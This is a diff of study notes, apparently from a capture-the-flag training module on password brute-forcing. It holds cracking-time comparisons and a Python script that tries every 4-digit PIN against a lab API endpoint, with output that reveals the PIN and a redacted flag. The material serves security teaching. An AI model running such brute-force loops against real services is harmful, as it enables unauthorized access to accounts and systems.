@@ -95,5 +95,49 @@ Let's consider a few scenarios to illustrate the impact of password length and c
 | **Maximum Complexity**      | 12              | Lowercase and uppercase letters, numbers, and symbols | 94^12 = 475,920,493,781,698,549,504 |
 While a complex password can take **years** to brute-force with a single machine, a sophisticated attacker using a distributed network of high-performance computing resources could reduce that time drastically:
 ![[Pasted image 20241216233948.png]]
+Comparing the basic computer and the supercomputer:
+- **Basic Computer (1 million passwords/second)**: Good for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.
+- **Supercomputer (1 trillion passwords/second)**: Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about **15000** years to crack.
 # Bute Force Attacks
 ##  Cracking the PIN
+The example application generates a random **4-digit PIN** and exposes an endpoint (`/pin`) that accepts a **PIN** as a query parameter. If the provided **PIN** matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.
+
+We will use this simple demonstration **Python** script to brute-force the `/pin` endpoint on the **API**.
+
+Copy and paste this Python script below as `pin-solver.py` onto your machine. You only need to modify the **IP** and **port** variables to match your target system information:
+```python
+import requests
+
+ip = "127.0.0.1"  # Change this to your instance IP address
+port = 1234       # Change this to your instance port number
+
+# Try every possible 4-digit PIN (from 0000 to 9999)
+for pin in range(10000):
+    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
+    print(f"Attempted PIN: {formatted_pin}")
+
+    # Send the request to the server
+    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
+
+    # Check if the server responds with success and the flag is found
+    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
+        print(f"Correct PIN found: {formatted_pin}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+```
+The Python script systematically iterates **all possible 4-digit PINs (0000 to 9999)** and sends **GET** requests to the Flask endpoint with each **PIN**. It checks the response status code and content to identify the correct **PIN** and capture the associated flag:
+```bash
+$ python pin-solver.py
+- - - -
+...SNIP...
+Attempted PIN: 4048
+Attempted PIN: 4049
+Attempted PIN: 4050
+Attempted PIN: 4051
+Attempted PIN: 4052
+Correct PIN found: 4053
+Flag: HTB{...}
+```
+## Dictionary Attacks 
+The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones. A well-crafted wordlist tailored to the target audience or system can significantly increase the probability of a successful breach. For instance, if the target is a system frequented by gamers, a wordlist enriched with gaming-related terminology and jargon would prove more effective than a generic dictionary.
+
